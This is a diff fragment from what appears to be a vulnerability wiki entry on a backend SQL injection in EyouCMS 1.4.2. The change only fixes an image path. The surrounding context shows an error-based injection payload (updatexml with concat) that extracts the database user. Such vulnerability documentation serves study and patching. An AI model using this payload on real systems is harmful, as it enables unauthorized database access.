@@ -134,7 +134,7 @@ payload：
 
     table=admin&id_name=admin_id&id_value='1'//and//updatexml(1,concat(0x7e,user(),0x7e),1)
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.4.2后台注入/media/rId26.png)
+![](./.resource/Eyoucms1.4.2后台注入/media/rId26.png)
 
 四、参考链接
 ------------
